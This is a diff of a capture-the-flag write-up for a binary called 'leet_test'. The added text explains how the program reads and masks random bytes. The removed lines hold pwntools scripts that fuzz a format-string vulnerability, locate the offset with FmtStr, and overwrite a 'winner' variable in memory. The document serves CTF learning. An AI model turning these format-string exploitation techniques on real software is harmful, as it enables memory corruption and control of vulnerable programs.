@@ -39,186 +39,28 @@ Are you 1337 enough?
 ![image](https://user-images.githubusercontent.com/70703371/210160678-49f0fc94-7c11-45f5-b274-74eda075b27e.png)
 
 
-7. The value of variable `local_13c` is read in from `/dev/urandom`
+7. The program opens `/dev/urandom`, then read 4 bytes from that file into `local_13c`. Next the program do `AND` operation on those random bytes that we got with `0xffff`.
 
-![image](https://user-images.githubusercontent.com/70703371/210160703-2c5e0343-ea88-4132-81f4-b16c0bcd3c13.png)
+
+![image](https://user-images.githubusercontent.com/70703371/211010008-1ffc912d-9ca6-4074-b12a-868e0a9bd9cd.png)
+
 
 
 > NOTES
 
 ```
 /dev/random and /dev/urandom are special files that serve as cryptographically secure pseudorandom number generators in linux. They allow access to environmental noise collected from device drivers and other sources.
+
+EXAMPLE OF "AND" OPERATION BASED ON THE CODE:
+
+Assume the random bytes is 77 77 77 77, then:
+
+77 77 77 77
+00 00 ff ff
+-------------- AND
+00 00 77 77
+
+Hence, we only have 2 random bytes left.
 ```
 
-8. What comes to my mind is we could overwrite the value of `local_13c` in the `/dev/urandom` with the value of `winner` divided by the `1337c0de`.
-
-```
-local_13c * 1337c0de / 1337c0de
-```
-
-9. But the problem here is, we will get a float value and float value will converted in various forms in hex.
-10. So that's not the correct approach.
-11. Anyway let's utilize the format string vulnerability to see if there's any clue.
-12. I made a script to fuzz the format strings specifier.
-
-> THE SCRIPT
-
-```py
-from pwn import *
-import os
-
-os.system('clear')
-
-elf = context.binary = ELF('./leet_test', checksec=False)
-sh = process(level='error')
-for i in range(256): # random range
-    try:
-        sh.sendline('%{}$s'.format(i))
-        sh.recvuntil('Hello,')
-        result = sh.recvline() # to receive the response / result
-        print(str(i) + ': ' + str(result))
-    except EOFError:
-        pass
-```
-
-13. First, run chmod to make the binary executeable, then run the script.
-
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/210160957-c1996945-770f-4327-ac66-36a941c93e98.png)
-
-
-14. Hmm.. Got only 4 iterations, let's try to `$p`.
-
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/210160967-a7e02ffa-35d8-4264-8a01-cc0c45443148.png)
-
-
-15. Got a bunch of stack addresses. 
-16. Hmm... Let's upgrade our fuzzy script to this:
-
-```py
-from pwn import *
-import os
-
-os.system('clear')
-
-elf = context.binary = ELF('./leet_test', checksec=False)
-context.log_level = 'error'
-for i in range(256): # random range
-    try:
-        sh = process('./leet_test')
-        sh.sendline('%{}$s'.format(i))
-        sh.recvuntil('Hello,')
-        result = sh.recvline() # to receive the response / result
-        print(str(i) + ': ' + str(result))
-        sh.close()
-    except EOFError:
-        pass
-```
-
-> OUTPUT
-
-![image](https://user-images.githubusercontent.com/70703371/210161010-d65ca93d-fd65-475c-863e-5fd10e2a1ff0.png)
-
-
-17. Notice that we're getting down to the environtment variables on my system.
-18. Now let's check wheter we can put our string inside.
-
-```py
-from pwn import *
-import os
-
-os.system('clear')
-
-elf = context.binary = ELF('./leet_test', checksec=False)
-context.log_level = 'error'
-
-sh = process('./leet_test')
-sh.sendline('AAAAAAAA')
-
-for i in range(256): # random range
-    try:
-        #sh = process('./leet_test')
-        sh.sendline('%{}$x'.format(i))
-        sh.recvuntil('Hello,')
-        result = sh.recvline() # to receive the response / result
-        print(str(i) + ': ' + str(result))
-        #sh.close()
-    except EOFError:
-        pass
-```
-
-> OUTPUT
-
-![image](https://user-images.githubusercontent.com/70703371/210161093-4cc695bc-7439-4df4-a332-592f5cf3d0ea.png)
-
-
-19. We succeed here, but we want to see the `hex` format of A (0x41).
-20. Let's add another 4 bytes.
-
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/210161105-bae24168-def5-4b74-8fd1-1e43735ff555.png)
-
-
-21. Yep we got it, means we need to right 8 bytes before print any address. 
-22. Now, we need to find the format strings offset. To do that i used `FmtStr`.
-
-> THE SCRIPT
-
-```py
-from pwn import *
-import os
-from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
-
-os.system('clear')
-
-exe = './leet_test'
-
-def start(argv=[], *a, **kw):
-    if args.REMOTE:
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:
-        return process([exe] + argv, *a, **kw)
-
-elf = context.binary = ELF(exe, checksec=False)
-context.log_level = 'debug'
-
-sh = start()
-
-def sendPayload(p):
-    sh.sendline(p)
-    sh.recvuntil('Hello,')
-    return sh.recvline()
-
-## GET THE FORMAT STRING OFFSET
-formatString = FmtStr(execute_fmt = sendPayload)
-info("Format String Offset: %d", formatString.offset)
-```
-
-> OUTPUT
-
-![image](https://user-images.githubusercontent.com/70703371/210161461-96d31b85-1e5c-4dce-a67e-7d4f94171e2a.png)
-
-
-![image](https://user-images.githubusercontent.com/70703371/210161501-f6a23d2b-a8fa-4261-af21-617ad8f71e0b.png)
-
-
-23. Got it at 10th iterations.
-24. Based from it we know that we need to write our value at offset of 10 to reference them.
-25. Let's write the `winner` value to 0, to do that, get the offset of winner.
-
-> RESULT
-
-![image](https://user-images.githubusercontent.com/70703371/210161539-d2659383-7333-41af-a0d2-05c69e133818.png)
-
-
-```py
-# using FmtStr
-formatString.write(0x404078, 0) # write 0 to winner
-```
-
-26. The issue now is overwriting the `urandom` value, because is not found somewhere in the memory to overwrite.
-27. To find that, we can leak the stack to find the offset.
+8.  
